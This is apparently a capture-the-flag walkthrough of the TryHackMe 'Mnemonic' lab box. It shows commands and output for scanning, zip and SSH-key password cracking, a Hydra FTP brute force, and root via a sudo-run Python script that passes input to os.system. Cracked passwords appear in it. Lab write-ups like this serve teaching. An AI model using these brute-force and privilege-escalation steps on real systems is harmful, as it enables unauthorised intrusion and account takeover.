@@ -1,0 +1,322 @@
+IP:10.10.41.118
+
+Nmap scan results:
+root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4 10.10.41.118
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 11:00 IST
+Nmap scan report for 10.10.41.118
+Host is up (0.17s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/webmasters/*
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/11%OT=21%CT=1%CU=41039%PV=Y%DS=2%DC=T%G=Y%TM=5FAB77
+OS:24%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
+OS:S(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST
+OS:11NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
+OS:N(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Robots.txt
+
+User-agent: *
+Allow: /
+Disallow: /webmasters/*
+
+Dirb and Gobuster Scan
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic# dirb http://10.10.41.118
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Nov 11 11:00:24 2020
+URL_BASE: http://10.10.41.118/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.41.118/ ----
++ http://10.10.41.118/index.html (CODE:200|SIZE:15)                                                                     
++ http://10.10.41.118/robots.txt (CODE:200|SIZE:48)                                                                     
++ http://10.10.41.118/server-status (CODE:403|SIZE:277)
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop# gobuster dir -u http://10.10.41.118/webmasters/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.41.118/webmasters/
+[+] Threads:        10
+[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/11/11 11:05:18 Starting gobuster
+===============================================================
+/admin (Status: 301)
+/backups (Status: 301)
+
+
+
+
+I was not able to access the admin and backups but I tried a bit of default checking like login.php or admin.php like that and found backups.zip.
+
+10.10.41.118/webmasters/backups/backups.zip
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic# wget http://10.10.41.118/webmasters/backups/backups.zip
+--2020-11-11 11:12:12--  http://10.10.41.118/webmasters/backups/backups.zip
+Connecting to 10.10.41.118:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 409 [application/zip]
+Saving to: 'backups.zip'
+
+backups.zip                                    100%[====================================================================================================>]     409  --.-KB/s    in 0s
+
+2020-11-11 11:12:12 (41.1 MB/s) - 'backups.zip' saved [409/409]
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic# file backups.zip
+backups.zip: Zip archive data, at least v1.0 to extract
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic# unzip backups.zip
+Archive:  backups.zip
+   creating: backups/
+[backups.zip] backups/note.txt password:
+   skipping: backups/note.txt        incorrect password
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic# fcrackzip -V -D -p /home/akshay/Downloads/rockyou.txt -u backups.zip
+validate only works for zip methods, use --method to select one.
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic# fcrackzip -v -D -p /home/akshay/Downloads/rockyou.txt -u backups.zip
+'backups/' is not encrypted, skipping
+found file 'backups/note.txt', (size cp/uc     67/    60, flags 9, chk 24e2)
+checking pw 055469215
+
+PASSWORD FOUND!!!!: pw == 00385007
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic#
+
+note.txt
+@vill
+
+James new ftp username: ftpuser
+we have to work hard
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic/backups# hydra -l ftpuser -P /home/akshay/Downloads/rockyou.txt ftp://10.10.41.118 -t20
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-11 11:20:52
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344398 login tries (l:1/p:14344398), ~717220 tries per task
+[DATA] attacking ftp://10.10.41.118:21/
+[STATUS] 320.00 tries/min, 320 tries in 00:01h, 14344078 to do in 747:06h, 20 active
+
+[STATUS] 313.33 tries/min, 940 tries in 00:03h, 14343458 to do in 762:57h, 20 active
+[21][ftp] host: 10.10.41.118   login: ftpuser   password: love4ever
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-11 11:24:34
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic/backups#
+
+250 Directory successfully changed.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    4 0        0            4096 Jul 14 18:05 .
+drwx------   12 1003     1003         4096 Jul 14 18:22 ..
+drwxr-xr-x    2 0        0            4096 Jul 14 18:04 3
+drwxr-xr-x    2 0        0            4096 Jul 14 18:04 4
+-rwxr-xr-x    1 1001     1001         1766 Jul 13 20:34 id_rsa
+-rwxr-xr-x    1 1000     1000           31 Jul 13 21:18 not.txt
+226 Directory send OK.
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+200 PORT command successful. Consider using PASV.
+ge150 Opening BINARY mode data connection for id_rsa (1766 bytes).
+t 226 Transfer complete.
+1766 bytes received in 0.08 secs (22.2415 kB/s)
+ftp> get not.txt
+local: not.txt remote: not.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for not.txt (31 bytes).
+226 Transfer complete.
+31 bytes received in 0.00 secs (40.2038 kB/s)
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic/backups# cat not.txt
+james change ftp user password
+
+
+Lets try to login via ssh
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic/backups# ssh -i id_rsa james@10.10.41.118 -p 1337
+load pubkey "id_rsa": invalid format
+Enter passphrase for key 'id_rsa':
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic/backups# wget https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
+--2020-11-11 11:29:52--  https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.36.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.36.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7781 (7.6K) [text/plain]
+Saving to: 'ssh2john.py'
+
+ssh2john.py                                    100%[====================================================================================================>]   7.60K  --.-KB/s    in 0s
+
+2020-11-11 11:29:53 (23.0 MB/s) - 'ssh2john.py' saved [7781/7781]
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic/backups# python ssh2john.py id_rsa > hash
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic/backups# john hash --wordlist=/home/akshay/Downloads/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 12 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bluelove         (id_rsa)
+1g 0:00:00:02 25.20% (ETA: 11:30:24) 0.4000g/s 1518Kp/s 1518Kc/s 1518KC/s shir0321..shipsbbq
+Session aborted
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop# ssh james@10.10.41.118 -p 1337
+james@10.10.41.118's password:
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Nov 11 06:06:57 UTC 2020
+
+  System load:  0.1                Processes:           94
+  Usage of /:   34.1% of 12.01GB   Users logged in:     0
+  Memory usage: 35%                IP address for eth0: 10.10.41.118
+  Swap usage:   0%
+
+  => There is 1 zombie process.
+
+
+51 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Thu Jul 23 20:40:09 2020 from 192.168.1.5
+james@mnemonic:~$ id
+uid=1001(james) gid=1001(james) groups=1001(james)
+james@mnemonic:~$
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic# echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d
+THM{a5f82a00e2fe####################}
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/mneumonic/backups/Mnemonic# python3 Mnemonic.py
+
+
+ooo        ooooo                                                                o8o
+`88.       .888'                                                                `"'
+ 888b     d'888  ooo. .oo.    .ooooo.  ooo. .oo.  .oo.    .ooooo.  ooo. .oo.   oooo   .ooooo.
+ 8 Y88. .P  888  `888P"Y88b  d88' `88b `888P"Y88bP"Y88b  d88' `88b `888P"Y88b  `888  d88' `"Y8
+ 8  `888'   888   888   888  888ooo888  888   888   888  888   888  888   888   888  888
+ 8    Y     888   888   888  888    .o  888   888   888  888   888  888   888   888  888   .o8
+o8o        o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P'
+
+
+******************************* Welcome to Mnemonic Encryption Software *********************************
+*********************************************************************************************************
+***************************************** Author:@villwocki *********************************************
+*********************************************************************************************************
+****************************** https://www.youtube.com/watch?v=pBSR3DyobIY ******************************
+---------------------------------------------------------------------------------------------------------
+
+
+Access Code image file Path:/home/akshay/Desktop/mneumonic/backups/maxresdefault.jpg
+File exists and is readable
+
+
+Processing:0.txt'dir.
+
+
+*************** PROCESS COMPLETED ***************
+Image Analysis Completed Successfully. Your Special Code:
+[18040524736954552171240290634275910766959300482314707502901100419741398548965224725941021802487032836173634780850941582665145982921504858872321671604862829564607684810526492066226402684287616853873210669999061793585789130700435803828790107520566469792840943480312282503452757516106152078159427180240005535346255332508553204437788143156338915508366294152127113927707875461041975995380102488277249004978168150375226943402813101473129934947391047550289946960484563830077512150922589946415843574688787885125530961139010129215262707445950279859171570703824082806870131361331767370463043186684480807380022655925970022578263260441484625103975073440016327873803686977341928854134976378773600501106381048323122645504600352672462576003715628729391078556691378514984869667325662681952842565476861053690293969966782880123327168780763438531971993188949492933279982487685918120778097782850287929842115690724987096321703212163060333224283284977289802827842879042839640262338746553035294867669059625954075656244962808053213786680390708256762450366138601087542331279508299395275052543712662356328041378219046371806187926898951884853219678957425819999274422457001222309298609639251426093640939141057849874336447995977756479546186718050005298641912474325522605377986224192640694882228380343957998739955025989717286813486502685888047917180755315870714390211946645377824808166849789179435231274421467146198503514028811829300781004919877657049378435667265681319881668251241048231624460484807297038652817741869560603973762676697915583148823703700356493329862580202524500957554509421887074199100294146498732117768932143672904961738653833526638191846440214708821866139175026618637297264825003345892737942605429893574715451387924833678705133789951929605852462681960477345012953624020311976391557709788081555805657631766992810607938136910032486660007651564422670123805991173718718054421178052348944476392816000024581612574082946930065731550351831453219624684151953579510511728103358957331905212408878550039564212574718137567251206027830512330028065065453978937864280959609862513771190784012965669450685145037267642052364077110425690327182134221410979503542884860706732849934129978585114218727611818535870279929449601149898359095286920635366467549708130906749543661896923083187366061909026289661930922600092201579516609661082432775711870335549545629510027691594227860730612243143186998690675558933362090484506118561221209707766409716340182306372820967200382582924543624088571734200353648616261606529316446377770014092636693341125452946580955407629142994557330066002481203213159235316398381340305331731160166517666856882223390348124513308977825051988793237597836987360929298623246303189249691856582689010276308942286830178274172390838724707574971941901952561981824488910046853278229420504365442198918541710225781407434471906744193785133373312799582855296856950856709835659758219138879225768326613692361174053301275224320175854389113874050923227343996320199043477174610191600388011901437299832085638741402321326712525403656134611009999653962145807100825283090403287783417942602115287432675425286401345041435462570643325863310648377212678849664669288738489546673696702139852781071024689212032925750241891326917244780892553526540693621507023878116197492063762724742734661528704061416514721525046633306388371457285426394045190956663884196393567921829300941889216301986124323562132630534219703037020584372302571474382440496441398574114480957204383033321943262503608350362011371242523468860301325689572145533367049207144001883042555930629828285092657187665911761012561666252765177388099698738547128081854538124632051019468014403510598252793989911273187304833487586015420746231436325474874148965434852180676060928100023644313812181795987232910338830331055834729510404938346846471989919015845599795735768790939643391619284305838250318876707485538128176905275930727621806314457956616994759990987819253690544858857585770580235516943059089670589008382216490392151650577917337444115061483517261902983890208304334109451908984031069448924459901518438359206228316357104747954666210709949514348792360318304939151977453561590231001285752786268039570819276963721730449210149230489645405656043361846832132327771993274964709698856004767446608538370095610585587983434524982269314296208590747643797536711604753777854347516951660314747499033416983591953318141292543620399914295001181141940259724324791049457851810362242220088435283906340004174699977928565275154490289396718044511845918775172725752454755679603428250332482282444608418419550363532603974145871838290800304446059866660551988834512932996464464096290454885378463244188011655534860313546313761759397376280991585278591022593760639416075100122750488675696958867052601661035394259353669506253871127432058487776848139996130655605672187446682975840302306598400089474008139886454382608332744746601204596315835032610624779552707307670309573035414379272605351453371872703122153274147603344093748070074860459646082074018819696125737477688740729695352743137967464691424821248000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000]              
+
+                                                                                                                        
+(1) ENCRYPT (2) DECRYPT                                                                                                 
+
+>>>>2
+ENCRYPT Message to file Path'
+
+Please enter the file Path:/home/akshay/Desktop/mneumonic/22.txt
+
+
+
+pasificbell1981
+
+
+PRESS TO QUİT 'ENTER' OR 'E' PRESS TO CONTİNUE.
+
+Condor's password : pasificbell1981
+
+condor@mnemonic:/home/james$ sudo -l
+[sudo] password for condor:
+Matching Defaults entries for condor on mnemonic:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User condor may run the following commands on mnemonic:
+    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
+condor@mnemonic:/home/james$
+
+ if select == 0:
+                        time.sleep(1)
+                        ex = str(input("are you sure you want to quit ? yes : "))
+
+                        if ex == ".":
+                                print(os.system(input("\nRunning....")))
+                        if ex == "yes " or "y":
+                                sys.exit()
+
+
+
+Look at this, if we type "." then the shell keeps running and then we can execute any commands like id,/bin/bash etc.
+
+
+Select:0
+are you sure you want to quit ? yes : .
+
+Running....id
+uid=0(root) gid=0(root) groups=0(root)
+0
+condor@mnemonic:/home/james$
+
+
+Yeah it works.
+
+Now lets execute /bin/bash
+
+Select:0
+are you sure you want to quit ? yes : .
+
+Running..../bin/bash
+root@mnemonic:/home/james# id
+uid=0(root) gid=0(root) groups=0(root)
+root@mnemonic:/home/james# cd /root
+root@mnemonic:/root# cat root.txt
+THM{congratulati##################}
+
+Thank you... Happy Hacking :)
